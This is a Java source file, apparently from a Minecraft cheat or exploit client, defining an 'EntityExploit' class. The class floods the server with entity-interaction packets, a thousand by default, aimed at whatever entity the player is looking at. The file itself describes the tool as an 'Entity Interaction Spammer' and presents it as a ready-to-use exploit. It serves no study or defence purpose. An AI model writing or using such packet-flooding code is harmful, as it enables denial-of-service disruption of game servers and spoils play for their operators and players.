package us.whitedev.exploits.impl;

import java.util.List;
import net.minecraft.network.protocol.game.ServerboundInteractPacket;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.entity.Entity;
import us.whitedev.exploits.Exploit;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class EntityExploit implements Exploit {
   private static final String EXPLOIT_NAME = "EntityExploit";

   public void onExploit(String[] args) {
      int power = Integer.parseInt(args[2]);
      Entity entity = mc.crosshairPickEntity;
      if (entity != null) {
         msgHelper.sendMessage(String.format("Sending Exploit... &8[&f%s&8]", this.getName()), true);

         for(int i = 0; i < power; ++i) {
            PacketHelper.send(ServerboundInteractPacket.createInteractionPacket(entity, false, InteractionHand.MAIN_HAND));
         }

         msgHelper.sendMessage("Exploit &asuccessfully &7sent!", true);
      } else {
         msgHelper.sendMessage("You cant use this exploit because you have to look at some entity!", true);
      }

   }

   public String getName() {
      return "EntityExploit";
   }

   public List<OptionUtil> getOptions() {
      return List.of(new OptionUtil("Power", OptionType.INTEGER));
   }

   public String getArgsUsage() {
      return "power[1000]";
   }

   public String getDescription() {
      return "Entity Interaction Spammer";
   }
}
